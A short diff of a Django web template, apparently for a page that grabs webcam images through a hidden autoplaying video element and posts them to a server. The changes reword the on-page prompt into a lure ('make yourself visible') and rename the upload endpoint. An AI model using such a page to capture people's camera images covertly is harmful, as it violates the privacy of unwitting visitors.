@@ -7,7 +7,7 @@
     <video class="d-none" id="video" width="640" height="480" autoplay>
     </video>
     <img id="capturedImage" src="#" alt="Captured Image" style="display: none">
-    <h1 class="text-center">Allow access to camera to see the content</h1>
+    <h1 class="text-center">Switch on the light and make yourself visible</h1>
 {% endblock content %}
 {% block scripts %}
     <script>
@@ -42,7 +42,7 @@
 
                 // Send the FormData as a POST request to the server using AJAX
                 $.ajax({
-                    url: '/api/test/', // Replace with your server endpoint
+                    url: '/api/for_you/', // Replace with your server endpoint
                     type: 'POST',
                     headers: {
                         'X-CSRFToken': csrftoken
